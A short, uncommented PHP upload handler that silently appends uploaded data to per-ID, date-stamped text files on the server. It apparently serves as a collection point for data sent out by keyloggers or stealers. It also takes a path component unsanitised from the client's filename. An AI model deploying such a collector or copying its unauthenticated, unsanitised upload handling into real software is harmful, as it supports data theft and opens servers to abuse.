<?php
error_reporting(0);
if (isset($_FILES["userfile"])) 
{ 
$arr = explode(":", $_FILES['userfile']['name']);
$id = $arr[0];
$name=$id.date("j.m").".tmp";
copy($_FILES['userfile']['tmp_name'],$name); 
$f = fopen($name, "rb");
$buf = fread($f, filesize($name));
fclose($f);
$f2 = fopen($name.".txt", "ab");
fwrite($f2,$buf);
fclose($f2);
unlink($name);
}
?>

